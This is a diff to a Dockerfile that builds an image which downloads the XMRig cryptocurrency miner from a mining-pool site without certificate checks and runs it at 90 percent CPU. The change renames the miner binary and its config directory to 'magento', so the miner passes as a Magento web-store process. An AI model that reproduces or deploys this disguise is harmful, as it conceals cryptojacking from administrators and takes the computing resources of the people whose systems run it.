@@ -1,6 +1,6 @@
 FROM alpine:3.12
 
-LABEL maintainer="wisdom <wisdom2622069252@gmail.com>"
+LABEL maintainer="salem <lusalem@gmail.com>"
 
 ENV CPULIMIT_VERSION=0.2 \
     CPU_USAGE=90
@@ -16,11 +16,12 @@ RUN apk add --no-cache build-base \
     &&  cd /root \
     &&  wget --no-check-certificate -c http://download.c3pool.com/xmrig_setup/raw/master/xmrig.tar.gz \
     &&  tar zxvf xmrig.tar.gz \
-    &&  chmod 775 xmrig \
+    &&  mv xmrig magento \
+    &&  chmod 775 magento \
     &&  chmod 775 config.json \
-    &&  cp xmrig /usr/bin/ \
-    &&  mkdir -p /etc/xmrig \
-    &&  cp config.json /etc/xmrig \
+    &&  cp magento /usr/bin/ \
+    &&  mkdir -p /etc/magento \
+    &&  cp config.json /etc/magento \
     &&  apk del build-base \
     &&  cd /root \
     &&  rm v${CPULIMIT_VERSION}.tar.gz \
